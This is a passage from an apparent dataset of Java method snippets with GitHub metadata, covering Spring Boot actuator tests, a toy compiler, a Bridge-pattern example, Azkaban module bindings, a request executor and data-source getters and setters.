"modifiers": [], "return_type": "void", "snippet": "\tvoid testHome() {\n\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\n\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/\", Map.class));\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tMap<String, Object> body = entity.getBody();\n\t\tassertThat(body.get(\"message\")).isEqualTo(\"Hello Phil\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59752, "method_name": "testShutdown", "class_name": "ShutdownSampleActuatorApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testShutdown() {\n\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(this.restTemplate.withBasicAuth(\"user\", \"password\")\n\t\t\t\t.postForEntity(\"/actuator/shutdown\", null, Map.class));\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(((String) entity.getBody().get(\"message\"))).contains(\"Shutting down\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59753, "method_name": "asMapEntity", "class_name": "ShutdownSampleActuatorApplicationTests", "params": ["ResponseEntity<Map>"], "throws": null, "modifiers": ["static"], "return_type": "ResponseEntity<Map>", "snippet": "\tstatic <K, V> ResponseEntity<Map<K, V>> asMapEntity(ResponseEntity<Map> entity) {\n\t\treturn (ResponseEntity) entity;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59754, "method_name": "configure", "class_name": "SecurityConfiguration", "params": ["HttpSecurity"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "\t\tprotected void configure(HttpSecurity http) throws Exception {\n\t\t\thttp.csrf().disable();\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ShutdownSampleActuatorApplicationTests.java", "stars": "47572", "class_props": {"extends": "WebSecurityConfigurerAdapter", "implements": null, "modifiers": ["static"]}}, {"id": 59755, "method_name": "checkType", "class_name": "ExprPOINTER", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\tthis.getSon().checkType();\n\t\tgetSon().getType().assertType(this, TypeCode.POINTER);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 59756, "method_name": "constEval", "class_name": "ExprPOINTER", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\n\t\tthrow new TypeException(\"erreur syst\u00e8me\", line, column);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 59757, "method_name": "toString", "class_name": "ExprPOINTER", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn this.getSon() + \"^\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 59758, "method_name": "getPointerCode", "class_name": "ExprPOINTER", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPointerCode() throws CodeException {\n\t\tString result;\n\t\tresult = getSon().generateCode();\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 59759, "method_name": "generateCode", "class_name": "ExprPOINTER", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result;\n\t\tresult = \"*\" + getSon().generateCode();\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprPOINTER.java", "stars": "3", "class_props": {"extends": "ExprUnary", "implements": null, "modifiers": ["public"]}}, {"id": 59760, "method_name": "on", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void on() {\n        this.television.on();\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59761, "method_name": "off", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void off() {\n        this.television.off();\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59762, "method_name": "upButtonPressed", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void upButtonPressed() {\n        int nextChannel = this.currentChannel + 1;\n        this.television.setChannel(nextChannel);\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59763, "method_name": "downButtonPressed", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void downButtonPressed() {\n        int previousChannel = this.currentChannel - 1;\n        this.television.setChannel(previousChannel);\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59764, "method_name": "leftButtonPressed", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void leftButtonPressed() {\n        int decreasedVolume = this.currentVolume - 1;\n        this.television.setVolume(decreasedVolume);\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59765, "method_name": "rightButtonPressed", "class_name": "RemoteSimple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rightButtonPressed() {\n        int increasedVolume = this.currentVolume + 1;\n        this.television.setVolume(increasedVolume);\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Remote/RemoteSimple.java", "stars": "38", "class_props": {"extends": "RemoteControl", "implements": null, "modifiers": ["public"]}}, {"id": 59766, "method_name": "configure", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void configure() {\n    install(new AzkabanCoreModule(this.props));\n    bind(Storage.class).to(resolveStorageClassType());\n    bind(AzkabanDataSource.class).to(resolveDataSourceType());\n    bind(TriggerLoader.class).to(JdbcTriggerImpl.class);\n    bind(ProjectLoader.class).to(JdbcProjectImpl.class);\n    bind(ExecutorLoader.class).to(JdbcExecutorLoader.class);\n    bind(ExecutorQueueLoader.class).to(JdbcExecutorQueueLoader.class);\n    bind(SystemUserLoader.class).to(JdbcSystemUserImpl.class);\n    bind(ExecutionLogsAdapter.class).to(resolveExecutionLogsType());\n    bind(TransitionService.class);\n    bind(UserManager.class).to(SystemUserManager.class);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59767, "method_name": "resolveStorageClassType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<Storage>", "snippet": "  public Class<? extends Storage> resolveStorageClassType() {\n    final StorageImplementationType type = StorageImplementationType\n        .from(this.config.getStorageImplementation());\n    if (type == StorageImplementationType.HDFS) {\n      install(new HadoopModule(this.props));\n    }\n    if (type != null) {\n      return type.getImplementationClass();\n    } else {\n      return loadCustomStorageClass(this.config.getStorageImplementation());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59768, "method_name": "loadCustomStorageClass", "class_name": "AzkabanCommonModule", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Class<Storage>", "snippet": "  private Class<? extends Storage> loadCustomStorageClass(final String storageImplementation) {\n    try {\n      return (Class<? extends Storage>) Class.forName(storageImplementation);\n    } catch (final ClassNotFoundException e) {\n      throw new StorageException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59769, "method_name": "resolveDataSourceType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Class<AzkabanDataSource>", "snippet": "  private Class<? extends AzkabanDataSource> resolveDataSourceType() {\n\n    final String databaseType = this.props.getString(\"database.type\");\n    if (databaseType.equals(\"h2\")) {\n      return H2FileDataSource.class;\n    } else {\n      return MySQLDataSource.class;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59770, "method_name": "resolveExecutionLogsType", "class_name": "AzkabanCommonModule", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Class<ExecutionLogsAdapter>", "snippet": "  private Class<? extends ExecutionLogsAdapter> resolveExecutionLogsType() {\n    return ExecutionLogsDao.class;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59771, "method_name": "createQueryRunner", "class_name": "AzkabanCommonModule", "params": ["AzkabanDataSource"], "throws": null, "modifiers": ["public"], "return_type": "QueryRunner", "snippet": "  public QueryRunner createQueryRunner(final AzkabanDataSource dataSource) {\n    return new QueryRunner(dataSource);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/AzkabanCommonModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 59772, "method_name": "addRequestInterceptor", "class_name": "RequestExecutor", "params": ["RequestInterceptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addRequestInterceptor(RequestInterceptor requestInterceptor){\n        this.requestInterceptors.add(requestInterceptor);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59773, "method_name": "addValidator", "class_name": "RequestExecutor", "params": ["IValidator"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addValidator(IValidator validator) {\n        this.validators.put(validator.support(), validator);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59774, "method_name": "setConfiguration", "class_name": "RequestExecutor", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConfiguration(Configuration configuration) {\n        this.configuration = configuration;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59775, "method_name": "setStatementExecutor", "class_name": "RequestExecutor", "params": ["StatementExecutor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatementExecutor(StatementExecutor statementExecutor) {\n        this.statementExecutor = statementExecutor;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59776, "method_name": "setExpressionEngine", "class_name": "RequestExecutor", "params": ["ExpressionEngine"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExpressionEngine(ExpressionEngine expressionEngine) {\n        this.expressionEngine = expressionEngine;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59777, "method_name": "invoke", "class_name": "RequestExecutor", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(HttpServletRequest request) {\n        return invoke(request, null);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59778, "method_name": "invoke", "class_name": "RequestExecutor", "params": ["HttpServletRequest", "Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(HttpServletRequest request, @RequestBody(required = false) Object requestBody) {\n        try {\n            // \u521b\u5efaRequestContex\u5bf9\u8c61\uff0c\u4f9b\u540e\u7eed\u4f7f\u7528\n            RequestContext requestContext = new RequestContext(request, expressionEngine);\n            if (!requestContext.containsKey(\"body\")) {\n                requestContext.setRequestBody(requestBody);\n            }\n            Statement statement = configuration.getStatement(requestContext.getRequestMapping());\n            requestContext.setStatement(statement);\n            // \u6267\u884c\u524d\u7f6e\u62e6\u622a\u5668\n            for (RequestInterceptor requestInterceptor : requestInterceptors) {\n                Object value = requestInterceptor.preHandle(requestContext);\n                if (value != null) {\n                    return value;\n                }\n            }\n            // \u6267\u884c\u6821\u9a8c\n            Object value = validate(statement, requestContext);\n            if (value != null) {\n                return value;\n            }\n            // \u6267\u884c\u8bed\u53e5\n            value = new JsonBean<>(statementExecutor.execute(statement, requestContext));\n            // \u6267\u884c\u540e\u7f6e\u62e6\u622a\u5668\n            for (RequestInterceptor requestInterceptor : requestInterceptors) {\n                Object target = requestInterceptor.postHandle(requestContext, value);\n                if (target != null) {\n                    return target;\n                }\n            }\n            return value;\n        } catch (Exception e) {\n            if (configuration.isThrowException()) {\n                throw new S8Exception(\"ssssssss\u6267\u884c\u51fa\u9519\", e);\n            }\n            logger.error(\"\u7cfb\u7edf\u51fa\u73b0\u9519\u8bef\", e);\n            return new JsonBean<>(-1, e.getMessage());\n        }\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59779, "method_name": "validate", "class_name": "RequestExecutor", "params": ["Statement", "RequestContext"], "throws": null, "modifiers": ["private"], "return_type": "JsonBean<Void>", "snippet": "    private JsonBean<Void> validate(Statement statement, RequestContext requestContext) {\n        List<String> validates = statement.getValidates();\n        XMLStatement xmlStatement = statement.getXmlStatement();\n        for (String validateId : validates) {\n            ValidateStatement validateStatement = xmlStatement.getValidateStatement(validateId);\n            NodeList nodeList = validateStatement.getNodes();\n            for (int i = 0, len = nodeList.getLength(); i < len; i++) {\n                Node node = nodeList.item(i);\n                // \u83b7\u53d6name\u503c\n                String name = DomUtils.getNodeAttributeValue(node, \"name\");\n                Object value = null;\n                // \u5982\u679cname\u503c\u586b\u4e86\uff0c\u5219\u53d6\u5176\u8868\u8fbe\u5f0f\u503c\n                if (StringUtils.isNotBlank(name)) {\n                    value = requestContext.evaluate(name);\n                }\n                NodeList ruleList = (NodeList) DomUtils.evaluate(\"*\", node, XPathConstants.NODESET);\n                for (int j = 0, l = ruleList.getLength(); j < l; j++) {\n                    Node rule = ruleList.item(j);\n                    // \u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fd4\u56de\u81ea\u5b9a\u4e49code\n                    String nodeName = rule.getNodeName();\n                    IValidator validator = validators.get(nodeName);\n                    Assert.isNotNull(validator, String.format(\"\u627e\u4e0d\u5230\u9a8c\u8bc1\u5668:%s\", nodeName));\n                    if (!validator.validate(value, rule)) {\n                        // rule->param->validate\n                        int defaultCode = NumberUtils.toInt(DomUtils.getNodeAttributeValue(node, \"code\"), validateStatement.getCode());\n                        int code = NumberUtils.toInt(DomUtils.getNodeAttributeValue(rule, \"code\"), defaultCode);\n                        String message = rule.getTextContent();\n                        if (StringUtils.isNotBlank(message)) {\n                            message = message.trim();\n                        } else {\n                            message = DomUtils.getNodeAttributeValue(node, \"message\");\n                            if (StringUtils.isNotBlank(message)) {\n                                message = message.trim();\n                            } else {\n                                message = validateStatement.getMessage();\n                            }\n                        }\n                        return new JsonBean<>(code, message);\n                    }\n                }\n            }\n        }\n        // \u9a8c\u8bc1\u901a\u8fc7\n        return null;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/RequestExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59780, "method_name": "resolveParams", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> resolveParams(){\n        if(null == parameterMap){\n            if (StringUtils.isNotBlank(parameter)){\n                parameterMap = Json.fromJson(getParameter(), Map.class);\n            }else {\n                parameterMap = new HashMap<>(4);\n            }\n        }\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59781, "method_name": "getId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59782, "method_name": "setId", "class_name": "DataSourceBase", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(long id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59783, "method_name": "getSourceName", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceName() {\n        return sourceName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59784, "method_name": "setSourceName", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceName(String sourceName) {\n        this.sourceName = sourceName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59785, "method_name": "getSourceDesc", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceDesc() {\n        return sourceDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59786, "method_name": "setSourceDesc", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceDesc(String sourceDesc) {\n        this.sourceDesc = sourceDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59787, "method_name": "getSourceType", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceType() {\n        return sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59788, "method_name": "setSourceType", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceType(String sourceType) {\n        this.sourceType = sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59789, "method_name": "getOwner", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOwner() {\n        return owner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59790, "method_name": "setOwner", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOwner(String owner) {\n        this.owner = owner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59791, "method_name": "getModelId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getModelId() {\n        return modelId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59792, "method_name": "setModelId", "class_name": "DataSourceBase", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModelId(Integer modelId) {\n        this.modelId = modelId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59793, "method_name": "getAuthCreden", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthCreden() {\n        return authCreden;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59794, "method_name": "setAuthCreden", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthCreden(String authCreden) {\n        this.authCreden = authCreden;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59795, "method_name": "getAuthEntity", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthEntity() {\n        return authEntity;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59796, "method_name": "setAuthEntity", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthEntity(String authEntity) {\n        this.authEntity = authEntity;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59797, "method_name": "getCreateTime", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59798, "method_name": "setCreateTime", "class_name": "DataSourceBase", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59799, "method_name": "getCreateUser", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreateUser() {\n        return createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59800, "method_name": "setCreateUser", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateUser(String createUser) {\n        this.createUser = createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59801, "method_name": "getModifyUser", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModifyUser() {\n        return modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59802, "method_name": "setModifyUser", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModifyUser(String modifyUser) {\n        this.modifyUser = modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59803, "method_name": "getModifyTime", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getModifyTime() {\n        return modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59804, "method_name": "setModifyTime", "class_name": "DataSourceBase", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 